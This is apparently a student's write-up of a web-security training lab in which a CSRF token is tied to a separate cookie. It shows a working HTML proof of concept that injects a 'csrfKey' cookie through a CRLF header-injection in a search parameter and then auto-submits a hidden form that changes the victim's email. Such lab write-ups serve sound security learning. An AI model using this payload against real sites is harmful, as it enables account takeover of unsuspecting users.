*This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
`wiener:peter`
`carlos:montoya`*

Noticed that there was a `csrfKey` cookie along with a `csrf` token for both the login request:
![[Screenshot 2024-05-23 at 11.16.28 AM.png]]
and the change email request:
![[Screenshot 2024-05-23 at 11.18.56 AM.png]]
The cookie and token remained the same for each request. 
I to figure out a way to inject the `csrfKey` into the victim browser before feeding my token to the victim. I found out that I could set cookies when searching through the blogs:
![[Screenshot 2024-05-23 at 2.33.01 PM.png]]
I figured that I could break out of the header and inject my own cookie, I sent the request to *Repeater*, and modified the request to the following:
![[Screenshot 2024-05-23 at 2.46.45 PM.png]]
Injected the following code into the exploit server:
```html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a42002103cb16ef82ffd8f00056005c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tester&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="SwRYPM8iZOZPnrvxwB89UZG6282Xu7Em" />
      <!-- <input type="submit" value="Submit request" /> -->
    </form>
	<img src="https://0a42002103cb16ef82ffd8f00056005c.web-security-academy.net/?search=test;+SameSite=None;%3b%0d%0aSet-Cookie%3a+csrfKey%3d87d6P8UhArwyErEyUn3MKqrIp79v6KTi;+SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
Stored and delivered the exploit to solve the lab. 